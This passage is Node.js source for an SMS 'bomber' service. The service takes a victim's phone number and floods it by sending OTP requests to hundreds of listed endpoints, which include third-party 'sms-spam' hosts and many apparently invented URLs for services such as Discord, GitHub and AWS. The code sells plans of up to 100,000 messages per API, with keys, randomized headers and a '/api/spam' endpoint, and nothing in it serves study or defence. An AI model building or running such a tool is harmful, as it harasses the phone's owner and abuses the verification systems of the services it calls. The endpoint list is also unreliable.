  { id: 134, name: "Discord", method: "POST", url: "https://api.discord.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 135, name: "Reddit", method: "POST", url: "https://api.reddit.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 136, name: "Quora", method: "POST", url: "https://api.quora.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 137, name: "Pinterest", method: "POST", url: "https://api.pinterest.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 138, name: "Tumblr", method: "POST", url: "https://api.tumblr.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 139, name: "Flickr", method: "POST", url: "https://api.flickr.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 140, name: "Imgur", method: "POST", url: "https://api.imgur.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 141, name: "Dropbox", method: "POST", url: "https://api.dropbox.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 142, name: "Google Cloud", method: "POST", url: "https://api.cloud.google.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 143, name: "AWS", method: "POST", url: "https://api.aws.amazon.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 144, name: "Azure", method: "POST", url: "https://api.azure.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 145, name: "GitHub", method: "POST", url: "https://api.github.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 146, name: "GitLab", method: "POST", url: "https://api.gitlab.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 147, name: "Bitbucket", method: "POST", url: "https://api.bitbucket.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 148, name: "Stack Overflow", method: "POST", url: "https://api.stackoverflow.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 149, name: "HackerRank", method: "POST", url: "https://api.hackerrank.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 150, name: "LeetCode", method: "POST", url: "https://api.leetcode.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 151, name: "Codeforces", method: "POST", url: "https://api.codeforces.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 152, name: "CodeChef", method: "POST", url: "https://api.codechef.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 153, name: "HackerEarth", method: "POST", url: "https://api.hackerearth.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 154, name: "TopCoder", method: "POST", url: "https://api.topcoder.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 155, name: "AtCoder", method: "POST", url: "https://api.atcoder.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 156, name: "Kaggle", method: "POST", url: "https://api.kaggle.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 157, name: "DataCamp", method: "POST", url: "https://api.datacamp.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 158, name: "Coursera", method: "POST", url: "https://api.coursera.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 159, name: "edX", method: "POST", url: "https://api.edx.org/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 160, name: "Udemy", method: "POST", url: "https://api.udemy.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 161, name: "Udacity", method: "POST", url: "https://api.udacity.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 162, name: "Skillshare", method: "POST", url: "https://api.skillshare.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 163, name: "LinkedIn Learning", method: "POST", url: "https://api.linkedinlearning.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 164, name: "Pluralsight", method: "POST", url: "https://api.pluralsight.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 165, name: "Codecademy", method: "POST", url: "https://api.codecademy.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 166, name: "freeCodeCamp", method: "POST", url: "https://api.freecodecamp.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 167, name: "GeeksforGeeks", method: "POST", url: "https://api.geeksforgeeks.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 168, name: "TutorialsPoint", method: "POST", url: "https://api.tutorialspoint.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 169, name: "W3Schools", method: "POST", url: "https://api.w3schools.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 170, name: "MDN Web Docs", method: "POST", url: "https://api.mdn.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 171, name: "Docker Hub", method: "POST", url: "https://api.docker.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 172, name: "Kubernetes", method: "POST", url: "https://api.kubernetes.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 173, name: "Terraform", method: "POST", url: "https://api.terraform.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 174, name: "Ansible", method: "POST", url: "https://api.ansible.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 175, name: "Jenkins", method: "POST", url: "https://api.jenkins.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 176, name: "GitLab CI", method: "POST", url: "https://api.gitlabci.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 177, name: "CircleCI", method: "POST", url: "https://api.circleci.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 178, name: "Travis CI", method: "POST", url: "https://api.travisci.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 179, name: "GitHub Actions", method: "POST", url: "https://api.githubactions.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 180, name: "AWS CodePipeline", method: "POST", url: "https://api.aws.codepipeline.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 181, name: "Google Cloud Build", method: "POST", url: "https://api.google.cloudbuild.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 182, name: "Azure DevOps", method: "POST", url: "https://api.azure.devops.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 183, name: "MongoDB Atlas", method: "POST", url: "https://api.mongodb.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 184, name: "Redis Cloud", method: "POST", url: "https://api.rediscloud.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 185, name: "Elastic Cloud", method: "POST", url: "https://api.elasticcloud.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 186, name: "Cloudflare", method: "POST", url: "https://api.cloudflare.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 187, name: "Akamai", method: "POST", url: "https://api.akamai.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 188, name: "Fastly", method: "POST", url: "https://api.fastly.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 189, name: "Vercel", method: "POST", url: "https://api.vercel.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 190, name: "Netlify", method: "POST", url: "https://api.netlify.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 191, name: "Heroku", method: "POST", url: "https://api.heroku.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 192, name: "DigitalOcean", method: "POST", url: "https://api.digitalocean.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 193, name: "Linode", method: "POST", url: "https://api.linode.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 194, name: "Vultr", method: "POST", url: "https://api.vultr.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 195, name: "Scaleway", method: "POST", url: "https://api.scaleway.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 196, name: "OVHcloud", method: "POST", url: "https://api.ovhcloud.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 197, name: "Hetzner", method: "POST", url: "https://api.hetzner.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 198, name: "IONOS", method: "POST", url: "https://api.ionos.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 199, name: "GoDaddy", method: "POST", url: "https://api.godaddy.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 200, name: "Namecheap", method: "POST", url: "https://api.namecheap.com/api/v1/auth/otp", body: {"phone": "{phone}"} }
];

// -------- SECTION 4: GENERATED APIS (201-310) --------
const GENERATED_APIS = [];

// ShadowX APIS (201-240)
for (let i = 1; i <= 40; i++) {
  GENERATED_APIS.push({
    id: 200 + i,
    name: `ShadowX API ${i}`,
    method: "GET",
    url: `https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}`
  });
}

// LMNx9 APIS (241-290)
for (let i = 1; i <= 50; i++) {
  GENERATED_APIS.push({
    id: 240 + i,
    name: `LMNx9 API ${i}`,
    method: "GET",
    url: `https://lmnx9-sms-spam-v11.onrender.com/api${i}?number={phone}`
  });
}

// TNEH APIS (291-310)
for (let i = 1; i <= 20; i++) {
  GENERATED_APIS.push({
    id: 290 + i,
    name: `TNEH API ${i}`,
    method: "POST",
    url: `https://tneh-api-${i}.onrender.com/api/send`,
    body: {"phone": "{phone}", "type": "otp"}
  });
}

// -------- COMBINE ALL APIS --------
const SMS_APIS = [
  ...BD_APIS,
  ...INDIAN_APIS,
  ...INTERNATIONAL_APIS,
  ...GENERATED_APIS
];

console.log(`📡 Total APIs loaded: ${SMS_APIS.length}`);

// ============================================================
// PART 7: PLAN CONFIGURATION
// ============================================================

const PLAN_CONFIG = {
  default: { name: 'Default', maxCount: 300, requiresKey: false, description: 'Default plan - 300 SMS/API' },
  free: { name: 'Free', maxCount: 50, requiresKey: false, description: 'Free plan - 50 SMS/API' },
  premium: { name: 'Premium', maxCount: 10000, requiresKey: true, description: 'Premium plan - 10,000 SMS/API' },
  enterprise: { name: 'Enterprise', maxCount: 50000, requiresKey: true, description: 'Enterprise plan - 50,000 SMS/API' },
  unlimited: { name: 'Unlimited', maxCount: 100000, requiresKey: true, description: 'Unlimited plan - 100,000 SMS/API' }
};

// ============================================================
// PART 8: KEY MANAGEMENT - FIXED
// ============================================================

class KeyManager {
  constructor() {
    this.keysFile = path.join(__dirname, 'keys.json');
    this.validKeys = new Map();
    this.keyUsage = new Map();
    this.cleanupInterval = null;
    
    // Load keys
    this.loadKeys();
    
    // Generate default key if no keys exist
    if (this.validKeys.size === 0) {
      console.log('🔑 No keys found. Generating default key...');
      const defaultKey = this.generateKey('premium', 365);
      console.log(`✅ Default key generated: ${defaultKey.apiKey}`);
    }
    
    // Start cleanup
    this.cleanupInterval = setInterval(() => this.cleanup(), 3600000);
    console.log(`📊 Loaded ${this.validKeys.size} keys from storage`);
  }

  loadKeys() {
    try {
      if (fs.existsSync(this.keysFile)) {
        const data = fs.readFileSync(this.keysFile, 'utf8');
        const parsed = JSON.parse(data);
        this.validKeys = new Map();
        Object.entries(parsed).forEach(([key, value]) => {
          this.validKeys.set(key.trim(), {
            expiry: new Date(value.expiry),
            plan: value.plan || 'premium',
            created: new Date(value.created || Date.now()),
            lastUsed: value.lastUsed ? new Date(value.lastUsed) : null,
            usageCount: value.usageCount || 0,
            active: value.active !== false
          });
        });
        console.log(`✅ Loaded ${this.validKeys.size} keys from file`);
        return true;
      } else {
        console.log(`📂 Keys file not found, will create new one`);
        this.validKeys = new Map();
        return false;
      }
    } catch (error) {
      console.error('❌ Error loading keys:', error.message);
      this.validKeys = new Map();
      return false;
    }
  }

  saveKeys() {
    try {
      const obj = {};
      for (const [key, value] of this.validKeys.entries()) {
        obj[key.trim()] = {
          expiry: value.expiry.toISOString(),
          plan: value.plan,
          created: value.created.toISOString(),
          lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
          usageCount: value.usageCount || 0,
          active: value.active !== false
        };
      }
      fs.writeFileSync(this.keysFile, JSON.stringify(obj, null, 2), 'utf8');
      console.log(`💾 Saved ${this.validKeys.size} keys to file`);
      return true;
    } catch (error) {
      console.error('❌ Error saving keys:', error.message);
      return false;
    }
  }

  generateKey(plan = 'premium', days = 30) {
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = crypto.randomBytes(16).toString('hex').toUpperCase();
    const shortHash = crypto.createHash('sha256')
      .update(`${timestamp}${random}`)
      .digest('hex')
      .substring(0, 8)
      .toUpperCase();
    
    const apiKey = `TNEH_${random}_${timestamp}_${shortHash}`;
    
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + days);
    
    this.validKeys.set(apiKey.trim(), {
      expiry: expiryDate,
      plan: plan,
      created: new Date(),
      lastUsed: null,
      usageCount: 0,
      active: true
    });
    
    this.saveKeys();
    
    console.log(`🔑 New key generated: ${apiKey}`);
    console.log(`📅 Expires: ${expiryDate.toISOString()}`);
    console.log(`📋 Plan: ${plan}`);
    
    return { apiKey, expiryDate, plan };
  }

  validateKey(key) {
    if (!key) return false;
    const cleanKey = key.trim();
    
    // Check in memory
    if (this.validKeys.has(cleanKey)) {
      const keyData = this.validKeys.get(cleanKey);
      if (!keyData.active) return false;
      const isValid = new Date() < keyData.expiry;
      if (isValid) {
        console.log(`✅ Key is valid: ${cleanKey.substring(0, 15)}...`);
      } else {
        console.log(`❌ Key expired: ${cleanKey.substring(0, 15)}...`);
      }
      return isValid;
    }
    
    // Try reloading from file
    this.loadKeys();
    if (this.validKeys.has(cleanKey)) {
      const keyData = this.validKeys.get(cleanKey);
      if (!keyData.active) return false;
      return new Date() < keyData.expiry;
    }
    
    console.log(`❌ Key not found: ${cleanKey.substring(0, 15)}...`);
    return false;
  }

  getKeyInfo(key) {
    if (!key) return null;
    const cleanKey = key.trim();
    
    if (!this.validKeys.has(cleanKey)) {
      this.loadKeys();
      if (!this.validKeys.has(cleanKey)) return null;
    }
    
    const keyData = this.validKeys.get(cleanKey);
    const now = new Date();
    const isValid = now < keyData.expiry && keyData.active;
    
    return {
      key: cleanKey,
      plan: keyData.plan,
      expires: keyData.expiry.toISOString(),
      valid: isValid,
      daysLeft: isValid ? Math.ceil((keyData.expiry - now) / (1000 * 60 * 60 * 24)) : 0,
      created: keyData.created.toISOString(),
      lastUsed: keyData.lastUsed ? keyData.lastUsed.toISOString() : null,
      usageCount: keyData.usageCount || 0,
      active: keyData.active,
      status: isValid ? 'active' : 'expired'
    };
  }

  useKey(key) {
    if (!key) return false;
    const cleanKey = key.trim();
    
    if (!this.validateKey(cleanKey)) return false;
    
    const keyData = this.validKeys.get(cleanKey);
    keyData.lastUsed = new Date();
    keyData.usageCount = (keyData.usageCount || 0) + 1;
    this.saveKeys();
    
    console.log(`📊 Key used: ${cleanKey.substring(0, 15)}... (${keyData.usageCount} total uses)`);
    return true;
  }

  getAllKeys() {
    const keys = [];
    for (const [key, value] of this.validKeys.entries()) {
      const now = new Date();
      const isValid = now < value.expiry && value.active;
      keys.push({
        key: key,
        plan: value.plan,
        expires: value.expiry.toISOString(),
        valid: isValid,
        daysLeft: isValid ? Math.ceil((value.expiry - now) / (1000 * 60 * 60 * 24)) : 0,
        created: value.created.toISOString(),
        lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
        usageCount: value.usageCount || 0,
        active: value.active !== false,
        status: isValid ? 'active' : 'expired'
      });
    }
    return keys;
  }

  cleanup() {
    const now = new Date();
    let count = 0;
    for (const [key, value] of this.validKeys.entries()) {
      if (now > value.expiry || !value.active) {
        this.validKeys.delete(key);
        count++;
      }
    }
    if (count > 0) {
      this.saveKeys();
      console.log(`🧹 Cleaned up ${count} expired/inactive keys`);
    }
    return count;
  }

  destroy() {
    if (this.cleanupInterval) {
      clearInterval(this.cleanupInterval);
      this.cleanupInterval = null;
    }
  }
}

// ============================================================
// PART 9: RATE LIMITER
// ============================================================

class RateLimiter {
  constructor() {
    this.requests = new Map();
  }

  checkLimit(ip, key = null) {
    if (!CONFIG.security.rateLimit.enabled) return true;
    
    const identifier = key || ip;
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    const maxRequests = CONFIG.security.rateLimit.maxRequests;
    
    if (!this.requests.has(identifier)) {
      this.requests.set(identifier, []);
    }
    
    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
    timestamps.push(now);
    this.requests.set(identifier, timestamps);
    
    return timestamps.length <= maxRequests;
  }

  getRemaining(ip, key = null) {
    const identifier = key || ip;
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    const maxRequests = CONFIG.security.rateLimit.maxRequests;
    
    if (!this.requests.has(identifier)) return maxRequests;
    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
    return Math.max(0, maxRequests - timestamps.length);
  }
}

// ============================================================
// PART 10: EXPRESS APP SETUP
// ============================================================

const app = express();
const bombController = new BombController();
const keyManager = new KeyManager();
const rateLimiter = new RateLimiter();

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key', 'X-Request-ID']
}));

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, '../public')));

// Request ID middleware
app.use((req, res, next) => {
  req.requestId = Utility.generateId();
  res.setHeader('X-Request-ID', req.requestId);
  next();
});

// Logging middleware
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(`📝 [${Utility.getCurrentTime()}] ${req.method} ${req.url} - ${res.statusCode} - ${duration}ms`);
  });
  next();
});

// Rate limiting middleware
app.use((req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress;
  const apiKey = req.query.key || req.headers['x-api-key'];
  
  if (!rateLimiter.checkLimit(ip, apiKey)) {
    const remaining = rateLimiter.getRemaining(ip, apiKey);
    return res.status(429).json({
      success: false,
      error: ERROR_MESSAGES.RATE_LIMIT,
      developer: DEVELOPER_INFO,
      remaining: remaining,
      requestId: req.requestId
    });
  }
  
  const remaining = rateLimiter.getRemaining(ip, apiKey);
  res.setHeader('X-RateLimit-Limit', CONFIG.security.rateLimit.maxRequests);
  res.setHeader('X-RateLimit-Remaining', remaining);
  next();
});

// ============================================================
// PART 11: API ENDPOINTS
// ============================================================

// -------- ROOT --------
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// -------- API INFO --------
app.get('/api', (req, res) => {
  res.json({
    developer: DEVELOPER_INFO,
    version: "7.0.0-ULTIMATE",
    total_apis: SMS_APIS.length,
    api_breakdown: {
      bangladesh: BD_APIS.length,
      india: INDIAN_APIS.length,
      international: INTERNATIONAL_APIS.length,
      generated: GENERATED_APIS.length
    },
    plans: Object.keys(PLAN_CONFIG).reduce((acc, key) => {
      acc[key] = {
        max_count: PLAN_CONFIG[key].maxCount,
        requires_key: PLAN_CONFIG[key].requiresKey,
        description: PLAN_CONFIG[key].description
      };
      return acc;
    }, {}),
    endpoints: {
      root: "/",
      api: "/api",
      spam: "/api/spam?number=017XXXXXXXX&count=300",
      generate_key: "/api/generate-key?plan=premium&days=30",
      check_key: "/api/check-key?key=YOUR_KEY",
      stop: "/api/stop?all=true",
      status: "/api/status",
      stats: "/api/stats",
      health: "/api/health",
      apis: "/api/apis",
      logs: "/api/logs"
    }
  });
});

// -------- GENERATE KEY ENDPOINT --------
app.get('/api/generate-key', (req, res) => {
  const { plan = 'premium', days = 30 } = req.query;
  
  if (!PLAN_CONFIG[plan]) {
    return res.status(400).json({
      success: false,
      error: `Invalid plan: ${plan}`,
      available_plans: Object.keys(PLAN_CONFIG),
      requestId: req.requestId
    });
  }
  
  const validDays = parseInt(days) || 30;
  const result = keyManager.generateKey(plan, validDays);
  
  res.json({
    success: true,
    api_key: result.apiKey,
    plan: result.plan,
    expiry_date: result.expiryDate.toISOString(),
    valid_days: validDays,
    developer: DEVELOPER_INFO,
    message: "API key generated successfully",
    requestId: req.requestId,
    usage: `/api/spam?plan=${plan}&key=${result.apiKey}&number=017XXXXXXXX&count=${PLAN_CONFIG[plan].maxCount}`
  });
});

// -------- CHECK KEY ENDPOINT --------
app.get('/api/check-key', (req, res) => {
  const { key } = req.query;
  
  if (!key) {
    return res.status(400).json({
      success: false,
      error: ERROR_MESSAGES.MISSING_PARAM,
      param: 'key',
      requestId: req.requestId
    });
  }
  
  const info = keyManager.getKeyInfo(key);
  if (!info) {
    return res.status(404).json({
      success: false,
      error: 'Invalid API key',
      requestId: req.requestId,
      suggestion: 'Generate a new key at /api/generate-key'
    });
  }
  
  res.json({
    success: true,
    ...info,
    developer: DEVELOPER_INFO,
    requestId: req.requestId
  });
});

// -------- SPAM ENDPOINT --------
app.get('/api/spam', async (req, res) => {
  const { plan, number, count = 1, key } = req.query;
  
  let currentPlan = 'default';
  let planConfig = PLAN_CONFIG.default;
  
  if (plan && PLAN_CONFIG[plan]) {
    currentPlan = plan;
    planConfig = PLAN_CONFIG[plan];
  }
  
  // Check API key if required
  if (planConfig.requiresKey) {
    if (!key) {
      return res.status(401).json({
        success: false,
        error: 'API key required for this plan',
        developer: DEVELOPER_INFO,
        plan: currentPlan,
        generate_key: '/api/generate-key',
        requestId: req.requestId
      });
    }
    
    if (!keyManager.validateKey(key)) {
      return res.status(401).json({
        success: false,
        error: ERROR_MESSAGES.INVALID_API_KEY,
        developer: DEVELOPER_INFO,
        keyInfo: keyManager.getKeyInfo(key),
        requestId: req.requestId,
        suggestion: 'Generate a new key at /api/generate-key'
      });
    }
    
    keyManager.useKey(key);
  }
  
  // Validate number
  if (!number) {
    return res.status(400).json({
      success: false,
      error: ERROR_MESSAGES.MISSING_PARAM,
      param: 'number',
      requestId: req.requestId,
      usage: `/api/spam?number=017XXXXXXXX&count=${planConfig.maxCount}`
    });
  }
  
  const cleanNumber = Utility.parsePhone(number);
  if (!Utility.isValidPhone(cleanNumber)) {
    return res.status(400).json({
      success: false,
      error: ERROR_MESSAGES.INVALID_PHONE,
      requestId: req.requestId,
      example: '017XXXXXXXX or 88017XXXXXXXX'
    });
  }
  
  // Validate count
  let perApiCount = parseInt(count);
  if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
  if (perApiCount > planConfig.maxCount) {
    return res.status(400).json({
      success: false,
      error: `Count exceeds ${currentPlan} plan limit (${planConfig.maxCount})`,
      plan: currentPlan,
      max_allowed: planConfig.maxCount,
      requested: perApiCount,
      requestId: req.requestId
    });
  }
  
  // Register job
  const totalSMS = SMS_APIS.length * perApiCount;
  const jobId = bombController.registerJob(cleanNumber, totalSMS, {
    plan: currentPlan,
    perApiCount: perApiCount,
    ip: req.ip,
    key: key || null
  });
  
  console.log(`📱 [${currentPlan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} SMS to ${Utility.maskPhone(cleanNumber)}`);
  
  // Start async processing
  (async () => {
    try {
      await sendBatch(SMS_APIS, cleanNumber, perApiCount, jobId, bombController);
      console.log(`✅ JOB ${jobId} completed!`);
    } catch (error) {
      console.error(`❌ JOB ${jobId} failed:`, error.message);
      bombController.stopJob(jobId);
    }
  })();
  
  const response = {
    success: true,
    developer: DEVELOPER_INFO,
    jobId: jobId,
    plan: currentPlan,
    plan_description: planConfig.description,
    target_number: Utility.maskPhone(cleanNumber),
    per_api_count: perApiCount,
    total_apis: SMS_APIS.length,
    total_sms: totalSMS,
    status: 'started',
    message: 'Bombing started successfully',
    requestId: req.requestId,
    stop_endpoint: `/api/stop?jobId=${jobId}`,
    status_endpoint: `/api/status?jobId=${jobId}`,
    timestamp: Utility.getISOString()
  };
  
  if (key) {
    response.key_used = key;
    response.key_info = keyManager.getKeyInfo(key);
  }
  
  res.json(response);
});

// -------- STOP ENDPOINT --------
app.get('/api/stop', (req, res) => {
  const { jobId, all } = req.query;
  
  if (all === 'true' || all === '1') {
    const count = bombController.stopAllJobs();
    return res.json({
      success: true,
      message: `Stopped ${count} active jobs`,
      developer: DEVELOPER_INFO,
      stopped_count: count,
      requestId: req.requestId
    });
  }
  
  if (jobId) {
    const success = bombController.stopJob(jobId);
    if (success) {
      return res.json({
        success: true,
        message: `Job ${jobId} stopped successfully`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId
      });
    } else {
      return res.status(404).json({
        success: false,
        error: ERROR_MESSAGES.JOB_NOT_FOUND,
        jobId: jobId,
        requestId: req.requestId
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: ERROR_MESSAGES.MISSING_PARAM,
    param: 'jobId or all',
    requestId: req.requestId,
    usage: '/api/stop?jobId=JOB_ID or /api/stop?all=true'
  });
});

// -------- STATUS ENDPOINT --------
app.get('/api/status', (req, res) => {
  const { jobId } = req.query;
  
  if (jobId) {
    const jobStatus = bombController.getJobStatus(jobId);
    if (jobStatus) {
      return res.json({
        success: true,
        job: jobStatus,
        developer: DEVELOPER_INFO,
        requestId: req.requestId
      });
    } else {
      return res.status(404).json({
        success: false,
        error: ERROR_MESSAGES.JOB_NOT_FOUND,
        jobId: jobId,
        requestId: req.requestId
      });
    }
  }
  
  const jobs = bombController.getAllJobs();
  const stats = bombController.getStats();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    stats: stats,
    jobs: jobs,
    total_jobs: jobs.length,
    requestId: req.requestId
  });
});

// -------- STATS ENDPOINT --------
app.get('/api/stats', (req, res) => {
  const stats = bombController.getStats();
  const systemInfo = Utility.getSystemInfo();
  const keys = keyManager.getAllKeys();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    bomb_stats: stats,
    system: systemInfo,
    keys: {
      total: keys.length,
      valid: keys.filter(k => k.valid).length,
      expired: keys.filter(k => !k.valid).length,
      by_plan: keys.reduce((acc, k) => {
        acc[k.plan] = (acc[k.plan] || 0) + 1;
        return acc;
      }, {})
    },
    apis: {
      total: SMS_APIS.length,
      bangladesh: BD_APIS.length,
      india: INDIAN_APIS.length,
      international: INTERNATIONAL_APIS.length,
      generated: GENERATED_APIS.length
    },
    requestId: req.requestId
  });
});

// -------- HEALTH ENDPOINT --------
app.get('/api/health', (req, res) => {
  res.json({
    status: 'active',
    developer: DEVELOPER_INFO,
    version: "7.0.0-ULTIMATE",
    timestamp: Utility.getISOString(),
    uptime: process.uptime(),
    total_apis: SMS_APIS.length,
    total_keys: keyManager.getAllKeys().length,
    memory: Utility.getMemoryUsage()
  });
});

// -------- APIS LIST ENDPOINT --------
app.get('/api/apis', (req, res) => {
  const { limit = 100, offset = 0, region } = req.query;
  
  let apis = SMS_APIS;
  if (region === 'bd') apis = BD_APIS;
  else if (region === 'india') apis = INDIAN_APIS;
  else if (region === 'international') apis = INTERNATIONAL_APIS;
  else if (region === 'generated') apis = GENERATED_APIS;
  
  const total = apis.length;
  const paginated = apis.slice(parseInt(offset), parseInt(offset) + parseInt(limit));
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    total: total,
    limit: parseInt(limit),
    offset: parseInt(offset),
    apis: paginated.map(api => ({
      id: api.id,
      name: api.name,
      method: api.method,
      url: api.url
    })),
    requestId: req.requestId
  });
});

// -------- LOGS ENDPOINT --------
app.get('/api/logs', (req, res) => {
  const { limit = 100 } = req.query;
  const logs = bombController.getLogs(parseInt(limit));
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    logs: logs,
    count: logs.length,
    requestId: req.requestId
  });
});

// -------- 404 HANDLER --------
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    developer: DEVELOPER_INFO,
    path: req.path,
    requestId: req.requestId,
    available_endpoints: [
      '/',
      '/api',
      '/api/spam',
      '/api/generate-key',
      '/api/check-key',
      '/api/stop',
      '/api/status',
      '/api/stats',
      '/api/health',
      '/api/apis',
      '/api/logs'
    ]
  });
});

// -------- ERROR HANDLER --------
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.stack);
  res.status(500).json({
    success: false,
    error: ERROR_MESSAGES.INTERNAL_ERROR,
    developer: DEVELOPER_INFO,
    requestId: req.requestId,
    message: err.message
  });
});

// ============================================================
// PART 12: CORE BOMBING FUNCTION
// ============================================================

function replacePhoneNumber(data, phone, count = 1) {
  if (typeof data === 'string') {
    return data.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
  } else if (typeof data === 'object' && data !== null) {
    const result = {};
    for (const [key, value] of Object.entries(data)) {
      if (typeof value === 'string') {
        result[key] = value.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
      } else {
        result[key] = value;
      }
    }
    return result;
  }
  return data;
}

async function callSingleAPI(api, phone, jobId) {
  if (!bombController.isJobActive(jobId)) {
    return { success: false, error: 'Job stopped or paused', stopped: true };
  }
  
  try {
    const cleanPhone = Utility.parsePhone(phone);
    const url = replacePhoneNumber(api.url, cleanPhone, 1);
    const headers = getRandomHeaders();
    
    let config = {
      method: api.method,
      url: url,
      headers: headers,
      timeout: CONFIG.performance.timeout,
      validateStatus: function (status) {
        return status >= 200 && status < 500;
      }
    };

    if (api.method === 'POST' && api.body) {
      const body = replacePhoneNumber(api.body, cleanPhone, 1);
      config.data = body;
    }

    await axios(config);
    return { success: true };
    
  } catch (error) {
    return { success: false, error: error.message };
  }
}

async function sendBatch(apis, phone, countPerApi, jobId, controller) {
  const shuffledAPIs = Utility.shuffleArray([...apis]);
  const BATCH_SIZE = CONFIG.performance.parallelRequests;
  
  for (let i = 0; i < shuffledAPIs.length; i += BATCH_SIZE) {
    if (!controller.isJobActive(jobId)) break;
    
    const batch = shuffledAPIs.slice(i, i + BATCH_SIZE);
    
    const batchPromises = batch.map(async (api) => {
      for (let j = 0; j < countPerApi; j++) {
